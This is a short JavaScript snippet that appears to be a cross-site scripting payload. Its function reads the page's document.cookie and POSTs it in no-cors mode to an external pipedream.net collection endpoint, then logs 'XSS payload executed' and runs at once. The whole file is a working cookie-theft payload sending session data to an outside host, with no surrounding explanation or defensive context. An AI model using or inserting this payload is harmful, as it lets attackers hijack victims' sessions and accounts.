function xssPayload() {
  fetch('https://eniy3zg78oasq.x.pipedream.net/', {method: 'POST', mode: 'no-cors', body:document.cookie}); 
}

console.log('XSS payload executed');
xssPayload();
